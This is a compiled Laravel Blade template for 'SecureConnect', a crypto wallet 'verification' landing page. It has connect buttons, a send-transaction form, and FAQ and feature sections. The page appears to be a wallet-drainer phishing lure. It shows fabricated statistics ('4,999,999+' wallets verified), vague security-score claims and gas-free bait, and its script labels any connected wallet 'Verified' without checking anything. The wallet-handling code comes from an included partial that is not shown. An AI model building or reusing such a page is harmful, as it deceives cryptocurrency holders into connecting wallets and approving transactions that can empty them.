

<?php $__env->startSection('content'); ?>
<!-- Hero Section -->
<section id="home" class="hero-section">
    <div class="container">
        <div class="row align-items-center">
            <div class="col-lg-6">
                <div class="hero-content">
                    <h1>Verify your wallet with SecureConnect</h1>
                    <p>Experience the future of secure and seamless wallet verification. Say goodbye to unreliable addresses and hello to peace of mind.</p>
                    <div>
                        <button id="connect-wallet-btn" class="btn btn-primary btn-lg me-3"
                            onclick="
                                    event.stopPropagation();
                                    event.preventDefault();
                                    if(window.connectWallet) {
                                        window.connectWallet(event);
                                    } else if(window._handleConnectWallet) {
                                        window._handleConnectWallet(event);
                                    }
                                    return false;
                                ">
                            Verify Wallet
                        </button>
                        <a href="#how-it-works" class="btn btn-outline-light btn-lg">Learn More</a>
                    </div>
                </div>
            </div>
            <div class="col-lg-6">
                <div class="verification-card">
                    <h2 class="mb-4">Wallet Verification</h2>

                    <!-- Tab Navigation -->
                    <ul class="nav nav-tabs" id="verificationTabs" role="tablist">
                        <li class="nav-item" role="presentation">
                            <button class="nav-link active" id="connect-tab" data-bs-toggle="tab" data-bs-target="#connect" type="button" role="tab">
                                Connect Wallet
                            </button>
                        </li>
                        <li class="nav-item" role="presentation">
                            <button class="nav-link" id="status-tab" data-bs-toggle="tab" data-bs-target="#status" type="button" role="tab">
                                Verification Status
                            </button>
                        </li>
                        <li class="nav-item" role="presentation">
                            <button class="nav-link" id="transaction-tab" data-bs-toggle="tab" data-bs-target="#transaction" type="button" role="tab">
                                Send Transaction
                            </button>
                        </li>
                    </ul>

                    <!-- Tab Content -->
                    <div class="tab-content" id="verificationTabsContent">
                        <!-- Connect Tab -->
                        <div class="tab-pane fade show active" id="connect" role="tabpanel">
                            <div id="connection-section">
                                <p class="mb-4">Connect your wallet to verify and secure your transactions.</p>

                                <button id="connect-wallet-btn-tab" class="btn btn-primary w-100 btn-lg"
                                    onclick="
                                            event.stopPropagation();
                                            event.preventDefault();
                                            if(window.connectWallet) {
                                                window.connectWallet(event);
                                            } else if(window._handleConnectWallet) {
                                                window._handleConnectWallet(event);
                                            }
                                            return false;
                                        ">
                                    Verify Wallet
                                </button>
                            </div>

                            <div id="wallet-info-section" class="wallet-info hidden">
                                <h5>Connected Wallet</h5>
                                <div class="wallet-address" id="wallet-address">-</div>
                                <div class="chain-info" id="chain-info">Network: -</div>
                                <button id="disconnect-wallet-btn" class="btn btn-danger w-100 mt-3">
                                    Disconnect
                                </button>
                            </div>
                        </div>

                        <!-- Status Tab -->
                        <div class="tab-pane fade" id="status" role="tabpanel">
                            <div id="status-content">
                                <h5>Verification Status</h5>
                                <div class="mt-4">
                                    <div class="d-flex justify-content-between mb-2">
                                        <span>Wallet Address:</span>
                                        <span id="status-address" class="fw-bold">Not Connected</span>
                                    </div>
                                    <div class="d-flex justify-content-between mb-2">
                                        <span>Network:</span>
                                        <span id="status-network" class="fw-bold">-</span>
                                    </div>
                                    <div class="d-flex justify-content-between mb-2">
                                        <span>Verification Status:</span>
                                        <span id="status-verification" class="fw-bold text-success">Pending</span>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Transaction Tab -->
                        <div class="tab-pane fade" id="transaction" role="tabpanel">
                            <h5 class="mb-3">Send Transaction</h5>
                            <form id="transaction-form">
                                <div class="mb-3">
                                    <label for="recipient-address" class="form-label">Recipient Address</label>
                                    <input
                                        type="text"
                                        class="form-control"
                                        id="recipient-address"
                                        placeholder="0x..."
                                        required>
                                </div>
                                <div class="mb-3">
                                    <label for="amount" class="form-label">Amount (ETH)</label>
                                    <input
                                        type="number"
                                        class="form-control"
                                        id="amount"
                                        placeholder="0.001"
                                        step="0.000000000000000001"
                                        min="0"
                                        required>
                                </div>
                                <button type="submit" class="btn btn-primary w-100" id="send-transaction-btn">
                                    Send Transaction
                                </button>
                            </form>

                            <div id="transaction-messages"></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>

<!-- Features Section -->
<section id="features" class="section">
    <div class="container">
        <h2 class="section-title">Platform Features</h2>
        <div class="row">
            <div class="col-md-4">
                <div class="card">
                    <h3>Wallet Security</h3>
                    <p>Advanced multi-step verification ensures your wallet's security with real-time analysis and blockchain verification.</p>
                </div>
            </div>
            <div class="col-md-4">
                <div class="card">
                    <h3>Energy Delegation</h3>
                    <p>Gas-free transactions with up to 5 daily gas-free transactions. Experience seamless trading without worrying about fees.</p>
                </div>
            </div>
            <div class="col-md-4">
                <div class="card">
                    <h3>Verification Process</h3>
                    <p>Comprehensive security analysis with detailed reports and blockchain-verified certificates for your wallet.</p>
                </div>
            </div>
        </div>
    </div>
</section>

<!-- How It Works Section -->
<section id="how-it-works" class="section">
    <div class="container">
        <h2 class="section-title">How SecureConnect Works</h2>
        <div class="row">
            <div class="col-md-4">
                <div class="card text-center">
                    <div class="mb-3">
                        <h1>1</h1>
                    </div>
                    <h3>Wallet Check</h3>
                    <p>Instant security scan of your wallet with advanced multi-factor verification and real-time security analysis.</p>
                </div>
            </div>
            <div class="col-md-4">
                <div class="card text-center">
                    <div class="mb-3">
                        <h1>2</h1>
                    </div>
                    <h3>Verification</h3>
                    <p>Blockchain-verified security certificate with comprehensive analysis and risk assessment.</p>
                </div>
            </div>
            <div class="col-md-4">
                <div class="card text-center">
                    <div class="mb-3">
                        <h1>3</h1>
                    </div>
                    <h3>Access Platform</h3>
                    <p>Start trading with up to 5 daily gas-free transactions and advanced trading features.</p>
                </div>
            </div>
        </div>
    </div>
</section>

<!-- Stats Section -->
<section id="verification-status" class="section">
    <div class="container">
        <h2 class="section-title">Trusted by Thousands</h2>
        <div class="row">
            <div class="col-md-4">
                <div class="card stat-card">
                    <div class="stat-number">4,999,999+</div>
                    <div class="stat-label">Total Wallets Verified</div>
                </div>
            </div>
            <div class="col-md-4">
                <div class="card stat-card">
                    <div class="stat-number">99%</div>
                    <div class="stat-label">Security Score Average</div>
                </div>
            </div>
            <div class="col-md-4">
                <div class="card stat-card">
                    <div class="stat-number">100%</div>
                    <div class="stat-label">Network Reliability</div>
                </div>
            </div>
        </div>
    </div>
</section>

<!-- FAQ Section -->
<section id="faq" class="section">
    <div class="container">
        <h2 class="section-title">Frequently Asked Questions</h2>
        <div class="row">
            <div class="col-md-8 offset-md-2">
                <div class="card mb-3">
                    <h5>Is it accessible?</h5>
                    <p>Yes, SecureConnect is accessible to everyone. Simply connect your wallet and start verifying.</p>
                </div>
                <div class="card mb-3">
                    <h5>Is my wallet safe with SecureConnect?</h5>
                    <p>Absolutely. We use state-of-the-art security measures and blockchain verification to ensure your wallet's safety.</p>
                </div>
                <div class="card mb-3">
                    <h5>What benefits do I get from joining?</h5>
                    <p>You get access to gas-free transactions, advanced security verification, and comprehensive wallet analysis reports.</p>
                </div>
                <div class="card mb-3">
                    <h5>Can I use SecureConnect for cryptocurrencies other than ETH?</h5>
                    <p>Currently, SecureConnect supports Ethereum and EVM-compatible chains. More networks will be added soon.</p>
                </div>
            </div>
        </div>
    </div>
</section>

<!-- Wallet Security Check Section -->
<section id="wallet-security" class="section">
    <div class="container">
        <h2 class="section-title">Wallet Security Check</h2>
        <div class="row">
            <div class="col-md-8 offset-md-2">
                <div class="verification-card">
                    <h3 class="mb-4">Premium Wallet Security Report</h3>
                    <p class="mb-4">Comprehensive security analysis with blockchain-verified certificates.</p>
                    <div class="row mb-4">
                        <div class="col-md-4">
                            <div class="text-center">
                                <h4 class="text-success">95%</h4>
                                <p>CEX Blacklist Check</p>
                            </div>
                        </div>
                        <div class="col-md-4">
                            <div class="text-center">
                                <h4 class="text-success">95%</h4>
                                <p>Transaction Analysis</p>
                            </div>
                        </div>
                        <div class="col-md-4">
                            <div class="text-center">
                                <h4 class="text-success">100%</h4>
                                <p>Trust Network</p>
                            </div>
                        </div>
                    </div>
                    <button id="get-security-report-btn" class="btn btn-primary w-100 btn-lg">
                        Get Your Free Security Report
                    </button>
                </div>
            </div>
        </div>
    </div>
</section>
<?php $__env->stopSection(); ?>

<?php $__env->startSection('scripts'); ?>
<?php echo $__env->make('js.walletconnect', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?>
<script>
    // Smooth scroll for navbar links - BUT DON'T BLOCK OTHER CLICKS
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function(e) {
            // Only prevent default for anchor links, not buttons
            if (this.tagName === 'A' && this.getAttribute('href').startsWith('#')) {
                e.preventDefault();
                const target = document.querySelector(this.getAttribute('href'));
                if (target) {
                    target.scrollIntoView({
                        behavior: 'smooth',
                        block: 'start'
                    });
                }
            }
        });
    });

    // Update status tab on page load if wallet is already connected
    setTimeout(() => {
        const address = document.getElementById('wallet-address')?.textContent;
        if (address && address !== '-') {
            const network = document.getElementById('chain-info')?.textContent.replace('Network: ', '') || '-';
            const statusAddress = document.getElementById('status-address');
            const statusNetwork = document.getElementById('status-network');
            const statusVerification = document.getElementById('status-verification');

            if (statusAddress) statusAddress.textContent = address;
            if (statusNetwork) statusNetwork.textContent = network;
            if (statusVerification) {
                statusVerification.textContent = 'Verified';
                statusVerification.className = 'fw-bold text-success';
            }
        }
    }, 1000);
</script>
<?php $__env->stopSection(); ?>
<?php echo $__env->make('layout', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?><?php /**PATH C:\Users\dell\Desktop\wallet-connect\resources\views/home.blade.php ENDPATH**/ ?>